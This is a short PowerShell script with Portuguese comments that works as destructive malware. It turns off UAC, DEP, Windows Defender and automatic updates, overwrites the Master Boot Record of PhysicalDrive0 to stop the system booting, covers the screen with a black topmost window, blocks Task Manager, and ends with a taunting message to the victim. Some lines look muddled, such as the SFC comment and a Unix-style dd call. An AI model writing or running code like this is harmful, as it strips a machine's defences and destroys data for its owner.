# Desativar UAC (Controle de Conta de Usuário)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0

# Desativar Proteção de Arquivos do Sistema (SFC)
# Nota: O comando sfc /scannow não tem opções para /offbootdir e /offwindir em PowerShell; normalmente é usado apenas em CMD.
# Portanto, este comando não é aplicável diretamente no PowerShell para desativar SFC.
# Certifique-se de executar "sfc /scannow" no CMD se for necessário.

# Desativar Proteção de Execução de Dados (DEP)
bcdedit.exe /set {current} nx AlwaysOff

# Desativar Windows Defender e outros serviços de segurança
Set-MpPreference -DisableRealtimeMonitoring $true
Stop-Service -Name "WinDefend" -Force
Set-Service -Name "WinDefend" -StartupType Disabled

# Alterar permissões do Registro para desabilitar atualizações automáticas
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX' -Name 'IsConvergedUpdateEnabled' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update' -Name 'AUOptions' -Value 1

# Excluir a MBR (Master Boot Record) para impedir o boot
# Atenção: Isto pode tornar o sistema não inicializável
# PREFERENCIALMENTE NÃO EXECUTE ESTE COMANDO SEM TESTAR ANTES EM UM AMBIENTE SEGURO

dd if=/dev/zero of=\\.\PhysicalDrive0 bs=512 count=1

# Congelar a tela usando um formulário do Windows
Add-Type -AssemblyName System.Windows.Forms

# Cria uma nova janela
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Congelamento de Tela'
$form.StartPosition = 'Manual'
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.BackColor = 'Black'
$form.TopMost = $true

# Cria um botão para fechar o formulário
$button = New-Object System.Windows.Forms.Button
$button.Text = 'Fechar'
$button.Location = New-Object System.Drawing.Point(10, 10)
$button.Add_Click({ $form.Close() })
$form.Controls.Add($button)

# Exibe o formulário
$form.ShowDialog()

# Bloquear o Gerenciador de Tarefas
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableTaskMgr' -Value 1

# Mensagem para indicar que o Gerenciador de Tarefas foi desativado
Write-Host "Olha acho que voce se ferrou."